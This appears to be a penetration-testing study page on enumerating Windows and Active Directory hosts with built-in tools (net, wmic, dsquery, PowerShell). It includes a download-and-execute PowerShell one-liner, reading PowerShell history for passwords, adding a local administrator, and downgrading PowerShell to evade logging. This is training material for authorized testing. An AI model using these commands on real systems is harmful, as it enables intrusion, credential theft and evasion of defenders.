---
description: >-
  This page discusses several techniques for utilizing native Windows tools to
  perform our enumeration. It's always better to use tools that are installed
  the system already than uploading our own.
---

# Living Off the Land



***



## Env Commands For Host & Network Recon

**Basic Enumeration Commands**

| **Command**                                             | **Result**                                                                                 |
| ------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `hostname`                                              | Prints the PC's Name                                                                       |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |



### Basic Enumeration

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 132047.png" alt=""><figcaption></figcaption></figure>

### Systeminfo

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 132302.png" alt=""><figcaption></figcaption></figure>



## PowerShell Commands

| **Cmd-Let**                                                                                                                | **Description**                                                                                                                                                                                                                               |
| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                                                               | Lists available modules loaded for use.                                                                                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_execution\_policies?view=powershell-7.2) settings for each scope on a host.                                       |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`          | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |



## Quick Checks Using Powershell

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 160945.png" alt=""><figcaption></figcaption></figure>

_<mark style="color:red;">**IMPORTANT:**</mark>_ Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older.

## **Downgrade Powershell**

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 161226.png" alt=""><figcaption></figcaption></figure>

_<mark style="color:red;">**NOTE:**</mark>_ Evidence will be left behind showing that a downgrade happened, and a suspicious defender may start investigating after seeing this happen. We can see where the downgrade happens below.

### E**xamining the PowerShell Event Log**

The primary place to look for powershell logs (triggered on downgrading powershell) is in the _**"Powershell Operational Log" @ Applications and Services Logs > Microsoft > Windows > PowerShell > Operational.**_



<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 161354.png" alt=""><figcaption><p>With <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2">Script Block Logging</a> enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly.</p></figcaption></figure>

We can see an example of this in the image below. Items in the red box are the log entries before starting the new instance, and the info in green is the text showing a new PowerShell session was started in HostVersion 2.0.

### S**tarting V2 Logs**

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 162254.png" alt=""><figcaption></figcaption></figure>



## Checking Defenses

Knowing what revision our AV settings are at and what settings are enabled/disabled can greatly benefit us. Here are some checks to run to get a better understanding of the hosts security:

### **Firewall Checks**

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 162542.png" alt=""><figcaption></figcaption></figure>

### **Windows Defender Check (from CMD.exe)**

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 162613 (1).png" alt=""><figcaption></figcaption></figure>

### **Get-MpComputerStatus**

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 162738.png" alt=""><figcaption></figcaption></figure>



## Network Information

| **Networking Commands**        | **Description**                                                                                                  |
| ------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `arp -a`                       | Lists all known hosts stored in the arp table.                                                                   |
| `ipconfig /all`                | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                  | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show state` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |

### **Using arp -a**

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 163358.png" alt=""><figcaption></figcaption></figure>

### V**iewing the Routing Table**

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 163444.png" alt=""><figcaption></figcaption></figure>

_<mark style="color:red;">**NOTE:**</mark>_ Using `arp -a` and `route print` will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.



## Windows Management Instrumentation (WMI)

We can use WMI to create a report on domain users, groups, processes, and other information from our host and other domain hosts.

\
**Quick WMI checks**

| **Command**                                                                          | **Description**                                                                                        |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |

This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 164208.png" alt=""><figcaption></figcaption></figure>

## Net Commands

_<mark style="color:red;">**IMPORTANT:**</mark>_ `net.exe` commands are typically monitored by EDR solutions and can quickly give up our location

### T**able of Useful Net Commands**

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |



### **Listing Domain Groups**

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 164407.png" alt=""><figcaption></figcaption></figure>

### Information about a Domain User

We can view information about specific users too.

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 164503.png" alt=""><figcaption></figcaption></figure>

###

## Dsquery

[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\(v=ws.11\)) is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run are comparable to those like Bloodhound and PowerView.

_<mark style="color:red;">**NOTE:**</mark>_ Dsquery will exist on any host with the Active Directory Domain Service Role Installed, and the dsquery DLL exists on all modern Windows systems by default `C:\Windows\System32\dsquery.dll`.

### **User Search**

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 165212.png" alt=""><figcaption></figcaption></figure>

### **Computer Search**

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 165252.png" alt=""><figcaption></figcaption></figure>

We can use a [dsquery wildcard search](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232\(v=ws.11\)) to view all objects in an OU, for example.

### **Wildcard Search**

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 165344 (1).png" alt=""><figcaption></figcaption></figure>

We can combine `dsquery` with LDAP search filters of our choosing. The below looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.

### U**sers With Specific Attributes Set (PASSWD\_NOTREQD)**

```powershell
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080
  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080
  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546
  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544
  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080
  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080
```

### S**earching for Domain Controllers**

```powershell
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

 sAMAccountName
 ACADEMY-EA-DC01$
```

## LDAP Filtering Explained

&#x20;[User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) looks like our query above: userAccountControl:1.2.840.113556.1.4.803. Below are the values and more information on UAC.

### U**AC Values**

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 171623.png" alt=""><figcaption></figcaption></figure>

**OID match strings**

OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

1. `1.2.840.113556.1.4.803`

When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

2. `1.2.840.113556.1.4.804`

When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

3. `1.2.840.113556.1.4.1941`

This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

**Logical Operators**

When building out search strings, we can utilize logical operators to combine values for the search. The operators `&` `|` and `!` are used for this purpose. For example we can combine multiple [search criteria](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) with the `& (and)` operator like so:\
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like `(&(1) (2) (3))`. The `!` (not) and `|` (or) operators can work similarly. For example, our filter above can be modified as follows:\
`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`

This would search for any user object that does `NOT` have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.

##

## Am I Alone?

When landing on a host for the first time, we should check and see if anyone else is logged in.

### **Using qwinsta**

<figure><img src="../../.gitbook/assets/Screenshot 2023-09-21 163253.png" alt=""><figcaption></figcaption></figure>
